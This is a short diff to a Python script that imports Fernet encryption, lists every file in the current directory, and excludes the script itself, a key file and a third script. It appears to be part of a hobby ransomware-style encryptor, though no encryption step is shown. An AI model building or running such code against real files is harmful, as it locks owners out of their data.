@@ -1,14 +1,12 @@
 import os
 
 from cryptography.fernet import Fernet
-# key
-# file = open("choco.mocha", "x")
 
 files = []
 
 # cwd stands for Current Working Directory // .listdir()
 for file in os.listdir():
-    if file == "mocha.py" or file == "choco.mocha":
+    if file == "mocha.py" or file == "choco.mocha" or file == "cappuccino.py":
         continue
     else: files.append(file)
 
